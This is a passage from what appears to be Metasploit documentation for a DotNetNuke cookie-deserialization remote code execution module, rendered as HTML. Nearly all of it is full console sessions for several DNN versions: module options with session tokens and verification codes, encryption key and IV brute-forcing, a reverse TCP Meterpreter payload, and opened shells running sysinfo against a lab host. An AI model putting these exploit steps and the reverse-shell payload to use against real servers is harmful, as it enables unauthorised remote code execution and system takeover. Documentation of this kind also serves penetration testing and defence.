exploit(windows/http/dnn_cookie_deserialization_rce) &gt; exploit\n\n[*] Checking for custom error page at: /__ ...\n[+] Custom error page detected.\n[*] Finding Key...\n[*] Searching at 648742.110 keys/s ...... 68.69% of keyspace complete.\n[+] KEY Found: B2ABB4BB\n[+] IV Found: 11A4D8BE\n[*] Total number of Keys tried: 29568463\n[*] Time to crack: 45.578 seconds\n[*] Started reverse TCP handler on 192.168.31.128:443 \n[*] Sending Exploit Payload to: /__ ...\n[*] Sending stage (179779 bytes) to 192.168.31.131\n[*] Meterpreter session 1 opened (192.168.31.128:443 -&gt; 192.168.31.131:49970) at 2019-07-10 14:46:38 -0400\n\nmeterpreter &gt; sysinfo\nComputer        : SERVER_NAME\nOS              : Windows 2016 (Build 14393).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"v920---v921-1\" style=\"position:relative;\"><a href=\"#v920---v921-1\" aria-label=\"v920   v921 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>v9.2.0 - v9.2.1</h3>\n<p>  Here's the expected output:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/windows/http/dnn_cookie_deserialization_rce \nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set RHOSTS 192.168.31.131\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set RPORT 8085\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set LHOST 192.168.31.128\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set LPORT 443\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set VERIFICATION_CODE xR9oL8FP2eE_\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set VERIFICATION_PLAIN 0-3\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set ENCRYPTED true\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set SESSION_TOKEN 20FED393A44F86138D9089074C819880222A494155CEFAC6FEAF2B3B5204A227625654D87EA48ECB1E509664A7E8E32644BD363D3E6FD3A3273B245EF2D10B5E13D7912B\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; check\n\n[*] Trying to determine DNN Version...\n[*] Checking version at /Documentation/License.txt ...\n[!] DNN Version Found: v9.2.0+ - Requires ENCRYPTED and SESSION_TOKEN. Setting target to 3 (v9.2.0 - v9.2.1). Site may also be 9.2.2 - try setting target 4 and supply a file of of verification codes, or specifiy valid Key and IV values.\n[*] Checking for custom error page at: /__ ...\n[+] Custom error page detected.\n[+] 192.168.31.131:8085 - The target appears to be vulnerable.\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; exploit\n\n[*] Checking for custom error page at: /__ ...\n[+] Custom error page detected.\n[*] Finding Key...\n[*] Searching at 641992.579 keys/s ...... 1.47% of keyspace complete.\n[+] KEY Found: 022BA242\n[+] IV Found: 0BCF9976\n[*] Total number of Keys tried: 633602\n[*] Time to crack: 0.987 seconds\n[*] Started reverse TCP handler on 192.168.31.128:443 \n[*] Sending Exploit Payload to: /__ ...\n[*] Sending stage (179779 bytes) to 192.168.31.131\n[*] Meterpreter session 1 opened (192.168.31.128:443 -&gt; 192.168.31.131:49971) at 2019-07-10 15:08:04 -0400\n\nmeterpreter &gt; sysinfo\nComputer        : SERVER_NAME\nOS              : Windows 2016 (Build 14393).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"v922---v930-rc\" style=\"position:relative;\"><a href=\"#v922---v930-rc\" aria-label=\"v922   v930 rc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>v9.2.2 - v9.3.0-RC</h3>\n<p>  Here's the expected output:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/windows/http/dnn_cookie_deserialization_rce \nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set RHOSTS 192.168.31.131\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set RPORT 8090\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set LHOST 192.168.31.128\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set LPORT 443\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set VERIFICATION_CODE /dnn930rc_verification_codes.txt\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set VERIFICATION_PLAIN 0-\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set ENCRYPTED true\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set SESSION_TOKEN 306A9A382E32E420739C589CCD5C44A7C2595A7163D3340DF4AD71D4223AFC6866E823F36C6171F84FD7352E6BEB17D66B9823567557988321A0867C7038FF6B0F5B0C1F943CBBDAC0B2EE3E\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set TARGET 4\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; check\n\n[*] Checking for custom error page at: /__ ...\n[+] Custom error page detected.\n[+] 192.168.31.131:8090 - The target is vulnerable.\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; exploit\n\n[*] Checking for custom error page at: /__ ...\n[+] Custom error page detected.\n[*] Finding Key...\n[*] Searching at 420798.449 keys/s ...... 15.24% of keyspace complete.\n[+] Possible Base Key Value Found: 2660A22D\n[*] Total number of Keys tried: 6558182\n[*] Time to crack: 15.585 seconds\n[*] Generated 128 possible base KEY values from 2660A22D\n[!] Finding possible base IVs. This may take a few minutes...\n[*] Found 4 potential Base IV values using 10 verification codes in 42.82 seconds.\n[*] Generated 512 possible base64 KEY and IV combinations.\n[!] Trying all possible KEY and IV combinations...\n[*] Starting HTTP listener on port 8080...\n[*] Using URL: http://192.168.31.128:8080/fCyQGz78\n[!] Sending 512 test Payload(s) to: /__. This may take a few minutes ...\n[*] Trying KEY and IV combination 440 of 512...\n[+] KEY: ByEypXIT and IV: zhKad5QC found\n[*] Started reverse TCP handler on 192.168.31.128:443 \n[*] Sending Exploit Payload to: /__ ...\n[*] Sending stage (179779 bytes) to 192.168.31.131\n[*] Meterpreter session 1 opened (192.168.31.128:443 -&gt; 192.168.31.131:49973) at 2019-07-10 15:39:12 -0400\n\nmeterpreter &gt; sysinfo\nComputer        : SERVER_NAME\nOS              : Windows 2016 (Build 14393).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"e1ec5f72-7d66-57fb-8034-938466c4b937"}}}